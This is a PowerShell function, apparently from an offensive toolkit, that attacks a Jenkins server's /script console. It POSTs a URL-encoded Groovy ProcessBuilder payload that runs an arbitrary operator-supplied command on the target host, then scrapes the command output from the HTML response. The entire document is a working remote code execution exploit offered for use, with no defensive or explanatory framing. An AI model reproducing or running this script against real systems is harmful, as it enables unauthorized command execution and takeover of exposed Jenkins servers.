 function Exploit-Jenkins() {
    

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [string] $Rhost,
        [Parameter(Mandatory=$True)]
        [string] $Cmd,
        [Parameter(Mandatory=$False)]
        [Int] $Port
    )
 Add-Type -Assembly System.Web
 $url = "http://"+$($Rhost)+":"+$($Port)+"/script"
 
 $cookiejar = New-Object System.Net.CookieContainer
 $Cmd = $Cmd -replace "\s","','"
 $Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)
 
 $webrequest = [System.Net.HTTPWebRequest]::Create($url);
 $webrequest.CookieContainer = New-Object System.Net.CookieContainer;
 $webrequest.Method = "GET"
 $webrequest.Credentials = $credCache
 if ($cookiejar -ne $null) { $webrequest.CookieContainer = $cookiejar }
 $response = $webrequest.GetResponse()
 $responseStream = $response.GetResponseStream()
 $streamReader = New-Object System.IO.Streamreader($responseStream)
 $output = $streamReader.ReadToEnd()
 

 $postdata="script=println+new+ProcessBuilder%28%27"+$($Cmd)+"%27%29.redirectErrorStream%28true%29.start%28%29.text&Submit=Run"
 $bytearray = [System.Text.Encoding]::UTF8.GetBytes($postdata)
 
 
 $webrequest = [System.Net.HTTPWebRequest]::Create($url)
 $webrequest.Credentials = $credCache
 if ($cookiejar -ne $null) { $webrequest.CookieContainer=$cookiejar }
 $webrequest.Method = "POST"
 $webrequest.ContentType = "application/x-www-form-urlencoded"
 $webrequest.ContentLength = $bytearray.Length
 $requestStream = $webrequest.GetRequestStream()
 
 
 $requestStream.Write($bytearray, 0, $bytearray.Length)
 $requestStream.Close()
 $response = $webrequest.GetResponse()
 $responseStream  = $response.GetResponseStream()
 
 
 $streamReader = New-Object System.IO.Streamreader($responseStream)
 $output = $streamReader.ReadToEnd()
 $null = $output -match "Result</h2><pre>((?si).+?)</pre>"
 
 
 return $matches[1]
 }
